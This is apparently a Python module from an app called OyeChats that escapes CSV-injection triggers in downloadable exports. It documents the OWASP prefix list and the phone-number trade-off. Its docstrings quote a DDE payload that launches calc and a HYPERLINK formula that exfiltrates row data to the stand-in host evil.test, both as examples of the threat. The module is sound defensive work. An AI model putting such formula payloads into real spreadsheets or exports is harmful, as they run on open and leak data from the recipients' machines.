"""CSV-injection escaping, shared by every export that emits a downloadable file.

Lives in ``app.core`` rather than next to any one route because three exports
now need it (per-bot analytics, lead export, and whatever comes next), and a
copy-per-route defence is one refactor away from being a copy-per-route hole.
No FastAPI or ORM imports here, so the worker can use it too.
"""

# Leading characters that make a spreadsheet treat a cell as a formula rather
# than as text. ``=`` and ``@`` start a formula outright; ``+``/``-`` start a
# signed expression; a leading TAB or CR is stripped by Excel before it makes
# that decision, so ``\t=cmd|'/c calc'!A0`` slips a formula past a naive
# first-character check. OWASP's CSV-injection list, in full.
CSV_FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: str | None) -> str:
    """Neutralise a spreadsheet formula hiding in an untrusted string.

    Every string in an OyeChats export originates outside the server — a bot
    name the customer typed, a company a website visitor typed into the lead
    form, a UTM parameter lifted off the host page's URL — and lands verbatim
    in a file that a customer (or *their* client) opens in Excel. A value of
    ``=HYPERLINK("https://evil.test/?"&A2,"Click")`` would execute on open and
    exfiltrate the rest of the row from a machine that never touched OyeChats.

    The fix is to stop the cell from ever *starting* with a formula trigger:
    prefix it with a single quote, which every spreadsheet reads as "the rest
    of this cell is literal text". The quote stays visible when a CSV is opened
    directly (unlike a typed cell, where it is consumed as a formatting hint) —
    a deliberate trade of cosmetics for not executing attacker input. Quoting
    alone would not do: Excel evaluates ``"=1+1"`` just the same, so RFC-4180
    escaping (which ``csv.writer`` already applies for delimiters, quotes and
    newlines) is a separate concern from this one.

    Server-computed integers — counters, scores, message totals — do not need
    this and should be written through unchanged, so the numeric columns stay
    numeric in the recipient's spreadsheet.

    Known and accepted cost: an E.164 phone number (``+91 98000 00000``) starts
    with ``+``, so it picks up the quote too, which on India's market is most
    rows of a lead export. Exempting values that "look like" a phone number is
    not an option — ``+1+1`` looks exactly as numeric as ``+91`` — and every
    published bypass of this defence lives in precisely that kind of heuristic.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(CSV_FORMULA_PREFIXES) else text
